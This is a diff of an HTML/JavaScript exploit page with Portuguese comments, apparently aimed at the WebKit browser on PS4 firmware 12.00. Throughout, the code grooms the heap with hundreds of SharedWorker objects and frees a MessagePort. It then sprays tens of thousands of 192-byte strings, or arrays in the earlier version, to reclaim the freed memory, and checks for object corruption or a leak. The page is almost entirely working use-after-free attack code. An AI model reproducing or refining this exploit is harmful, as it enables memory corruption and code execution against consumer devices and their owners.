@@ -2,138 +2,133 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
+    <title>PS4 12.00 STRING ATTACK (0xC0)</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - ALVO 0xC0 (192 bytes)</h1>
-    <h3>Estratégia: Butterfly Double Spray</h3>
+    <h1>ALVO: 0xC0 (192 bytes) - STRING MODE</h1>
+    <h3>Tática: Usar Strings para furar o IsoHeap</h3>
+    
+    <button onclick="run_string_attack()">DISPARAR STRINGS</button>
     <div id="status">Pronto.</div>
     <div id="log"></div>
-    <br>
-    <button onclick="run_surgical()">INICIAR EXTRAÇÃO</button>
 
     <script>
         function log(msg, type="") {
             var d = document.getElementById("log");
-            var color = type === "leak" ? "#ff00ff" : "#ccc";
+            var color = type === "success" ? "#0f0" : "#ccc";
             d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 1. PAYLOAD 0xC0 (192 bytes)
+        // 1. PAYLOAD: STRING DE 192 BYTES
         // =================================================================
-        function build_payload() {
-            // 192 bytes totais.
-            // Header do Array no WebKit: 16 bytes.
-            // Dados úteis: 176 bytes.
-            // 176 / 8 bytes (double) = 22 elementos.
-            
-            var arr = new Array(22);
-            
-            // PREENCHIMENTO INTELIGENTE:
-            // Não usamos apenas 1.1. Usamos valores que parecem ponteiros.
-            // Se o JS ler isso como um objeto, ele vai tentar seguir o ponteiro.
-            
-            // 0x4141414141414141 (AAAA...) como Double
-            // Valor: 2.12199579047e-314
-            var marker = 2.12199579047e-314; 
-
-            for(var i=0; i<arr.length; i++) {
-                arr[i] = marker;
+        // No WebKit, Strings têm um header.
+        // Para ocupar 192 bytes (0xC0) no bloco de memória, a string deve ter
+        // um tamanho específico de caracteres.
+        // Header (24 bytes em 64-bit) + Caracteres * 2 (UTF-16) = 192
+        // (192 - 24) / 2 = 84 caracteres.
+        // Vamos testar 84 chars.
+        
+        function build_string_payload() {
+            var len = 84; 
+            var str = "";
+            // Padrão "A" (0x0041) repetido
+            // Se lido como ponteiro, vira 0x00410041... (Userland seguro ou Crash limpo)
+            for(var i=0; i<len; i++) {
+                str += "A";
             }
-            return arr;
+            return str;
         }
 
         // =================================================================
         // 2. EXECUÇÃO
         // =================================================================
-        var workers_stash = [];
+        var workers = [];
+        var strings_stash = []; // Segura as strings na memória
 
-        async function run_surgical() {
+        async function run_string_attack() {
             if(!window.SharedWorker) return log("Erro: Navegador.");
             
-            var payload = build_payload();
-            log("Payload 0xC0 construído.");
+            var payload = build_string_payload();
+            log(`Payload String construído (${payload.length} chars).`);
 
-            // GROOMING (380)
-            log("Grooming...");
+            // 1. GROOMING (380)
+            log("Grooming (Base)...");
             for(let i=0; i<380; i++) {
-                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // TRIGGER (403)
-            var p_count = 0;
+            // 2. TRIGGER (403)
+            // Zona de pressão máxima sem crashar
+            var count = 0;
             var limit = 403 - 380;
 
             var it = setInterval(() => {
-                if (p_count >= limit) {
+                if (count >= limit) {
                     clearInterval(it);
                     
-                    // VÍTIMA
-                    var v = workers_stash.pop();
+                    log("!!! DISPARANDO NO 403 !!!");
+                    
+                    // Vítima
+                    var v = workers.pop();
                     var p = v.port;
                     
                     // FREE
                     v.port.close();
                     v = null;
                     
-                    // SPRAY MASSIVO
-                    // 40.000 cópias para garantir que o buraco 0xC0 seja preenchido
-                    log("Spraying 0xC0...");
-                    var spray = [];
-                    for(var k=0; k<40000; k++) {
-                        spray.push(payload.slice(0));
+                    // SPRAY DE STRINGS (Reclaim)
+                    // Strings são alocadas muito rápido. Faremos muitas.
+                    log("Injetando 50.000 Strings...");
+                    for(var k=0; k<50000; k++) {
+                        // Cria string nova a cada vez para forçar alocação
+                        // Adiciona índice no final para evitar desduplicação do motor JS
+                        // Mas mantendo o tamanho fixo (removemos chars do inicio para compensar o indice)
+                        var suffix = k.toString();
+                        var s = payload.substring(suffix.length) + suffix;
+                        strings_stash.push(s);
                     }
 
-                    // SONDA
+                    // CHECK
                     setTimeout(() => {
-                        check_leak(p);
+                        try {
+                            var s = p.toString();
+                            
+                            // Se a string substituiu o objeto, o 'vtable pointer' agora é 0x00410041...
+                            // O navegador vai tentar chamar a função toString nesse endereço.
+                            // Isso DEVE crashar (Panic ou WebPage Error).
+                            
+                            if (s.indexOf("MessagePort") === -1) {
+                                log("!!! SUCESSO ABSOLUTO !!!", "success");
+                                log("Objeto virou String!", "success");
+                                alert("LEAK ENCONTRADO VIA STRING!");
+                            } else {
+                                log("Falha: Objeto ainda é MessagePort.");
+                                // Tenta ler propriedade para forçar o uso do ponteiro corrompido
+                                var temp = p.onmessage;
+                            }
+                        } catch(e) {
+                            log("ERRO DE MEMÓRIA (BOM SINAL): " + e, "success");
+                        }
+                        
+                        // Se não deu panic ainda, tenta forçar mais uma vez
+                        try { p.postMessage("DIE"); } catch(e){}
+
                     }, 500);
                     
                     return;
                 }
                 
                 try {
-                    let w = new SharedWorker("data:text,1", "v"+p_count);
+                    let w = new SharedWorker("data:text,1", "v"+count);
                     w.port.start();
-                    workers_stash.push(w);
+                    workers.push(w);
                 } catch(e){}
-                p_count++;
-            }, 60);
-        }
-
-        function check_leak(port) {
-            try {
-                var s = port.toString();
-                
-                // Se mudou de [object MessagePort], é SUCESSO
-                if (s.indexOf("MessagePort") === -1) {
-                    log("!!! SUCESSO ABSOLUTO !!!", "leak");
-                    log("Objeto Corrompido: " + s, "leak");
-                    alert("LEAK CONFIRMADO! Tamanho 0xC0 é o correto.");
-                } else {
-                    log("Falha: Objeto intacto.");
-                    
-                    // Tenta ler propriedades internas para forçar erro de tipo
-                    // Se o objeto foi corrompido, 'onmessage' deve apontar para lixo (0x4141...)
-                    try { 
-                        var temp = port.onmessage; 
-                        if (temp !== null) log("Propriedade onmessage alterada: " + temp);
-                    } catch(e) {
-                        if(e.toString().match(/0x/)) {
-                            log("LEAK NO ERRO: " + e, "leak");
-                            alert("LEAK NO ERRO!");
-                        }
-                    }
-                }
-            } catch(e) {
-                log("ERRO CRÍTICO (BOM SINAL): " + e, "leak");
-            }
-            
-            // Limpeza segura
-            workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
+                count++;
+            }, 50);
         }
     </script>
 </body>
